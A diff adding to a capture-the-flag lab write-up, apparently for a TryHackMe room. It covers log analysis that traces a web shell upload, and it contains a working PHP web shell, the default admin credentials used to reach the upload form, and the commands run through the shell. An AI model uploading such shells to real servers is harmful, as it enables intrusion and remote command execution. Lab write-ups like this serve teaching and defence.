@@ -55,3 +55,40 @@ Go to https://github.com/MM-WarevilleTHM/IS/commits/main/
 * Search/Filter by `event.category = process`
 * Check `powershell.exe` executions with a `-EncodedCommand` value
 * Put that value in [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Decode_text('UTF-16LE%20(1200)')&input=U1FCdUFITUFkQUJoQUd3QWJBQXRBRmNBYVFCdUFHUUFid0IzQUhNQVZRQndBR1FBWVFCMEFHVUFJQUF0QUVFQVl3QmpBR1VBY0FCMEFFRUFiQUJzQUNBQUxRQkJBSFVBZEFCdkFGSUFaUUJpQUc4QWJ3QjBBQT09)
+
+## Log analysis Day 3 - Even if I wanted to go, their vulnerabilities wouldn't allow it
+
+**BLUE: Where was the web shell uploaded to?**
+**BLUE: What IP address accessed the web shell?**
+
+* Select index `frostypines-resorts`
+* Select events between `Oct 3, 2024 @ 11:30:00.000` and `Oct 3, 2024 @ 12:00:00.000`
+* Select fields `clientip` and `request`
+* Search by `message: "shell.php"`
+* Select the IP that executes suspicious commands (query parameter `command`)
+
+**RED: What is the contents of the flag.txt?**
+
+* Execute `sudo echo "10.101.200.8 frostypines.thm" >> /etc/hosts`
+* Go to http://frostypines.thm/login.php with user=admin@frostypines.thm and password=admin
+* Go to http://frostypines.thm/admin/add_room.php and create a new room uploading `shell.php` as its image:
+  ```html
+    <html>
+        <body>
+            <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+                <input type="text" name="command" autofocus id="command" size="50">
+                <input type="submit" value="Execute">
+            </form>
+            <pre>
+            <?php
+                if(isset($_GET['command'])) 
+                {
+                    system($_GET['command'] . ' 2>&1'); 
+                }
+            ?>
+            </pre>
+        </body>
+    </html>
+  ```
+* Go to http://frostypines.thm/media/images/rooms/shell.php?command=ls
+* Go to http://frostypines.thm/media/images/rooms/shell.php?command=cat%20flag.txt
